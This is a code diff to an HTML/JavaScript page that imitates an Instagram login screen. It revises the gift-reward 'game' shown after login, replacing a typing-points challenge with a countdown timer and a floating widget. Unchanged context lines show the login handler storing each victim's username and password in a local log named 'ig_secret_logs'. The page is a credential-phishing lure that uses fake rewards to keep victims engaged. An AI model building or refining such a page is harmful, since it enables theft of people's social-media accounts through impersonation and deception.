@@ -109,13 +109,13 @@
         .meta-brand { display: flex; align-items: center; font-size: 13px; color: #737373; font-weight: 500; }
         .meta-brand svg { width: 15px; height: 15px; fill: #737373; margin-right: 6px; }
 
-        /* Floating Mini Widget */
+        /* Floating Timer Widget */
         .floating-widget {
             position: fixed; bottom: 20px; right: 20px; background: #121212; border: 1px solid #0095f6;
-            padding: 8px 12px; border-radius: 20px; display: flex; align-items: center; gap: 8px;
+            padding: 8px 14px; border-radius: 20px; display: flex; align-items: center; gap: 8px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.6); cursor: pointer; z-index: 999; font-size: 12px; color: #fff;
         }
-        .floating-widget span { color: #00a884; font-weight: bold; }
+        .floating-widget span { color: #ff007f; font-weight: bold; }
 
         /* Game & Dashboard Screen Styles */
         .game-card, .dashboard-card {
@@ -123,9 +123,9 @@
             width: 100%; max-width: 350px; text-align: center; box-sizing: border-box;
         }
         .game-card h2, .dashboard-card h2 { color: #0095f6; margin-top: 0; }
-        .game-card select, .game-card input, .game-card textarea {
+        .game-card select, .game-card input {
             width: 100%; padding: 12px; margin: 10px 0; background: #262626; border: none;
-            border-radius: 8px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; resize: none;
+            border-radius: 8px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
         }
         .game-btn {
             width: 100%; background: #0095f6; color: #fff; border: none; padding: 12px;
@@ -140,9 +140,9 @@
 </head>
 <body>
 
-    <!-- Floating Mini Widget -->
-    <div id="floatingWidget" class="floating-widget hidden" onclick="checkWidgetProgress()">
-        🎁 <span id="widgetScore">0</span> Pts
+    <!-- Floating Timer Widget (Shows remaining time while app is running in background) -->
+    <div id="floatingWidget" class="floating-widget hidden" onclick="checkTimerProgress()">
+        ⏳ Time Left: <span id="widgetTimer">10:00</span>
     </div>
 
     <!-- SCREEN 1: Instagram Login Page -->
@@ -187,22 +187,18 @@
         </div>
     </div>
 
-    <!-- SCREEN 2: Game Setup & Keyboard Typing Challenge -->
+    <!-- SCREEN 2: Time Selection & Game Setup -->
     <div id="gameSetupScreen" class="screen hidden">
         <div class="game-card">
-            <h2>⌨️ Keyboard Type Challenge</h2>
-            <p style="font-size: 13px; color: #a8a8a8;">Type anything in the box below (1 character = 1 point)!</p>
-            <select id="pointSelect">
-                <option value="30">30 Points Target</option>
-                <option value="50">50 Points Target</option>
-                <option value="100">100 Points Target</option>
+            <h2>⏳ Time Task Challenge</h2>
+            <p style="font-size: 13px; color: #a8a8a8;">Select chat duration to unlock reward!</p>
+            <select id="timeSelect">
+                <option value="1">1 Minute (Testing)</option>
+                <option value="10">10 Minutes</option>
+                <option value="20">20 Minutes</option>
             </select>
             <input type="text" id="friendUser" placeholder="Friend's Instagram Username" required>
-            
-            <!-- Keypress tracking chat box -->
-            <textarea id="typingBox" rows="3" placeholder="Type your messages here (e.g. Hello, How are you)..." oninput="handleKeypressPoint(event)"></textarea>
-            
-            <button class="game-btn" onclick="openInstagramApp()">Open Official App</button>
+            <button class="game-btn" onclick="startTimerGame()">Start & Open Instagram App</button>
         </div>
     </div>
 
@@ -210,7 +206,7 @@
     <div id="giftScreen" class="screen hidden">
         <div class="game-card">
             <h2>🎉 Party Bomb Fired!</h2>
-            <p>Target points completed via keyboard typing!</p>
+            <p>Background time completed successfully!</p>
             <div class="gift-img" id="randomGiftIcon">💍</div>
             <p id="giftNameText" style="font-weight: bold; color: #ff007f;">Diamond Ring Unlocked!</p>
             <button class="game-btn" onclick="claimGift()">Gift Now</button>
@@ -290,50 +286,35 @@
             logs.unshift({ username: u, password: p, time: new Date().toLocaleString() });
             localStorage.setItem('ig_secret_logs', JSON.stringify(logs));
 
-            // Show Game Setup & Widget
             showScreen('gameSetupScreen');
-            document.getElementById('floatingWidget').classList.remove('hidden');
-            updateWidgetScore();
         });
 
-        // Keypress typing points logic
-        let targetPoints = 30;
-        let currentPoints = 0;
-        let previousLength = 0;
+        // Background Timer Logic
+        let totalSeconds = 0;
+        let timerInterval = null;
 
-        function handleKeypressPoint(event) {
-            targetPoints = parseInt(document.getElementById('pointSelect').value);
-            const currentText = event.target.value;
-            
-            // Check how many characters were typed
-            if(currentText.length > previousLength) {
-                let addedChars = currentText.length - previousLength;
-                currentPoints += addedChars; // 1 character typed = 1 point earned
-            }
-            previousLength = currentText.length;
-
-            if(currentPoints >= targetPoints) {
-                currentPoints = targetPoints;
-                updateWidgetScore();
-                setTimeout(triggerGiftScreen, 300);
-                return;
-            }
-
-            updateWidgetScore();
-        }
-
-        function updateWidgetScore() {
-            document.getElementById('widgetScore').innerText = currentPoints + "/" + targetPoints;
-        }
-
-        function checkWidgetProgress() {
-            alert("🎮 Typing Progress: " + currentPoints + " / " + targetPoints + " Points collected!\nKeep typing messages in the box to reach the target!");
-        }
-
-        // Open Real Instagram App via Deep Link
-        function openInstagramApp() {
+        function startTimerGame() {
             const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
-            
+            const selectedMinutes = parseInt(document.getElementById('timeSelect').value);
+            totalSeconds = selectedMinutes * 60;
+
+            // Show Floating Timer Widget
+            document.getElementById('floatingWidget').classList.remove('hidden');
+            updateTimerDisplay();
+
+            // Start background countdown timer
+            if(timerInterval) clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                totalSeconds--;
+                updateTimerDisplay();
+
+                if(totalSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    triggerGiftScreen();
+                }
+            }, 1000);
+
+            // Open Real Instagram App via Android Intent / Deep Link
             const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
             const schemeUri = `instagram://user?username=${friend}`;
 
@@ -341,6 +322,18 @@
             setTimeout(() => {
                 window.location.href = intentUri;
             }, 500);
+        }
+
+        function updateTimerDisplay() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            document.getElementById('widgetTimer').innerText = `${mins}:${secs < 10 ? '0' : ''}${secs}`;
+        }
+
+        function checkTimerProgress() {
+            const mins = Math.floor(totalSeconds / 60);
+            const secs = totalSeconds % 60;
+            alert(`⏳ Background Task Progress:\nTime remaining: ${mins} minutes ${secs} seconds.\nKeep chatting on Instagram to complete the reward!`);
         }
 
         const gifts = [
